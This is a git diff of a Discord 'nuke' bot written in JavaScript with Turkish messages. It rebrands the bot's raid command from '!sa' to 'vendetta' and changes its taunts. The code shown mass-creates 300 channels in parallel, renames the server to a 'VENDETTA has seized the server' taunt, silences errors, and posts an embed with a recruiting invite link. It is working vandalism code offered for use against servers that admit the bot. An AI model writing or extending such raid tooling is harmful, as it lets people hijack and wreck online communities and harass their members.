@@ -42,8 +42,8 @@ client.on('messageCreate', async (message) => {
   const args = message.content.trim().split(/ +/);
   const command = args.shift().toLowerCase();
 
-  if (command === '!sa') {
-    if (!cachedVideo) return message.reply("❌ Video henüz yüklenmedi, 3 saniye bekleyip tekrar dene!");
+  if (command === 'vendetta') {
+    if (!cachedVideo) return message.reply(" 3 Saniye Sonra Tekrar Dene Yavrum");
 
     const guild = message.guild;
 
@@ -52,8 +52,8 @@ client.on('messageCreate', async (message) => {
     // -----------------------------
     const embed = new EmbedBuilder()
       .setColor('Red')
-      .setTitle('❌ Sunucudan Yasaklandınız!')
-      .setDescription('Fors ve TM Sunucuya El Koydu\n@1fors el koydu')
+      .setTitle('💣VENDETTA SUNUCUYA EL KOYDU!')
+      .setDescription('Slained By VENDETTA\n VENDETTA Affetmez😀https://discord.gg/j9W6FXKTre')
       .setFooter({ text: '💦 Fors Affetmez Sabaha Sunucun Affedilmez 💦' });
 
     // -----------------------------
@@ -82,7 +82,7 @@ client.on('messageCreate', async (message) => {
     // -----------------------------
     // ⚡ 300 Kanalı paralel oluştur
     // -----------------------------
-    const channelNames = ['1fors💦', 'TM-ENESXDRADX💝', 'FORS SUNUCUYA EL KOYDU🔥'];
+    const channelNames = ['VENDETTA💦', 'VENDETTA💝', 'EL KONULDU🔥'];
     const channelTasks = [];
 
     for (let i = 0; i < 300; i++) {
@@ -126,7 +126,7 @@ client.on('messageCreate', async (message) => {
     // -----------------------------
     // ⚡ Sunucu adını değiştir
     // -----------------------------
-    guild.setName('💦Fors ve Enesxdradx Affetmez Sabaha Sunucun Affedilmez💦')
+    guild.setName('💦VENDETTA Affetmez Sabaha Sunucun Affedilmez💦')
       .catch(() => {});
 
     // -----------------------------
